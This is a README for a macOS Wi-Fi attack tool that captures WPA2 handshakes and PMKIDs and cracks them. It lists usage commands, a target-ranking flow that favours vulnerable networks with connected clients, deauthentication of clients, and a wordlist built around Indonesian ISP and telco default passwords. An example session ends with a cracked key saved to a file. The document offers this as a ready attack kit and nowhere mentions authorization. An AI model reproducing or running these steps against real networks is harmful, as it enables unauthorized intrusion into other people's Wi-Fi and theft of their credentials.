# wifi_attack — macOS Wi-Fi Handshake + PMKID Capture & Crack

## files
```
wifi_attack/
├── wifi_attack.py      # main capture + crack script (enhanced)
├── gen_wordlist.py     # EN + ID wordlist generator (enhanced)
├── wordlist_en_id.txt  # generated wordlist (after running gen_wordlist.py)
└── wifi_cap/           # captures + cracked.txt + session logs (auto-created)
```

## deps
```bash
brew install aircrack-ng hcxtools

# airport symlink (required)
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```

## usage
```bash
# step 1 — generate wordlist
python3 gen_wordlist.py

# step 2 — run attack (needs root)
sudo python3 wifi_attack.py

# auto-select best target (no prompt)
sudo python3 wifi_attack.py --auto

# only PMKID attack (no clients needed)
sudo python3 wifi_attack.py --pmkid-only

# only handshake capture
sudo python3 wifi_attack.py --handshake-only

# capture only, no cracking
sudo python3 wifi_attack.py --no-crack

# prefer external USB Wi-Fi adapter
sudo python3 wifi_attack.py --external

# custom wordlist
sudo python3 wifi_attack.py -w /path/to/custom.txt

# longer scan
sudo python3 wifi_attack.py --scan-time 30
```

## flow
1. auto-detects Wi-Fi interface (built-in or external USB via `--external`)
2. scans visible APs via `airport -s` (enriches with client count via quick airodump)
3. ranks targets: **clients > PMKID vuln > signal > WPA2 > WPA3**
4. you pick a target (or `--auto` selects best)
5. **PMKID attack first** (if vulnerable — works without clients)
6. **Handshake capture** with adaptive deauth (only if clients present)
7. cracks with `aircrack-ng` against wordlist
8. if no hit → converts `.cap` to `.hc22000` for `hashcat -m 22000` GPU crack

## new features
| feature | description |
|---------|-------------|
| **PMKID attack** | captures PMKID via association/disassociation — no clients needed |
| **WPA3/SAE detection** | identifies and skips uncrackable WPA3 targets |
| **PMF/802.11w detection** | flags protected management frames (blocks deauth) |
| **target ranking** | auto-sorts by client count, PMKID vuln, RSSI, encryption |
| **handshake verification** | validates capture before cracking (avoids wasted attempts) |
| **adaptive deauth** | only sends deauth if clients associated; stops early on handshake |
| **session logs** | JSON logs in `~/wifi_cap/session_*.json` for post-analysis |
| **external adapter support** | `--external` prefers USB Wi-Fi dongles (Alfa, TP-Link, etc.) |
| **hashcat-style rules** | wordlist generator applies leet, case, append/prepend, insert, delete rules |

## wordlist contents
- **English**: common passwords, names, phrases, router brands, leet variants, year suffixes, keyboard patterns
- **Indonesian**: cities, names, slang, telco/ISP defaults (`indihome`, `telkomsel`, `xl`, `axis`, `three`, `smartfren`, `byu`, `cbn`, `myrepublic`, `oxygen`, `firstmedia`, `biznet`, `speedy`), Islamic phrases, e-commerce brands, national/patriotic terms, phone number patterns
- **mutations**: capitalize, UPPER, leet (`a→4 e→3 i→! o→0 s→5 t→7 b→8 g→9`), extended leet, hashcat-style rules (append/prepend numbers/symbols, insert, delete, reverse, case toggle), year suffixes (1970-2026), common combos

## gen_wordlist.py options
```bash
# targeted mutations for specific SSID
python3 gen_wordlist.py --target-ssid "MyHomeWifi"

# custom base words (one per line)
python3 gen_wordlist.py --custom-words my_words.txt

# custom hashcat-style rules
python3 gen_wordlist.py --rules my_rules.rule

# disable default rules
python3 gen_wordlist.py --no-default-rules

# custom output
python3 gen_wordlist.py -o /path/to/wordlist.txt
```

## results
- cracked credentials → `~/wifi_cap/cracked.txt`
- session logs → `~/wifi_cap/session_YYYYMMDD_HHMMSS.json`
- hashcat-ready captures → `~/wifi_cap/*.hc22000`

## real-world notes
- **macOS built-in Wi-Fi** has limited monitor mode; **external USB adapter** (Atheros AR9271, Realtek RTL8812AU, MediaTek MT7612U) strongly recommended
- **PMKID** works on WPA2-PSK with roaming enabled (no PMF, not WPA3)
- **WPA3/SAE** and **PMF** targets are auto-detected and skipped
- **no clients** = handshake capture unlikely; PMKID is only option
- wordlist targets **weak/default passwords** — strong unique passphrases won't crack

## example session
```
$ sudo python3 wifi_attack.py --auto --external
[+] interface: en1
[*] scanning for networks (20s)...
[*] enumerating clients...

#  BSSID                CH   RSSI  CLI  PMF  PMKID  WPA3  ENC                    ESSID
0  aa:bb:cc:dd:ee:ff    6    -45   2    N    Y      N     WPA2-PSK               IndiHome_ABCD

[+] target locked: IndiHome_ABCD (aa:bb:cc:dd:ee:ff) ch6 RSSI=-45dBm clients=2 PMF=N PMKID_vuln=Y

[*] target vulnerable to PMKID attack — attempting...
[+] PMKID captured → /Users/user/wifi_cap/capture_PMKID_IndiHome_ABCD_aabbccddeeff_20241121_143022.cap

[*] cracking → wordlist: wordlist_en_id.txt (245,321 words)
[+] KEY FOUND: indihome123

[+] ━━━━━━━━━━━━━━━━━━━━━━
    SSID : IndiHome_ABCD
    BSSID: aa:bb:cc:dd:ee:ff
    KEY  : indihome123
[+] ━━━━━━━━━━━━━━━━━━━━━━
[+] saved → /Users/user/wifi_cap/cracked.txt
[+] session log → /Users/user/wifi_cap/session_20241121_143022.json
```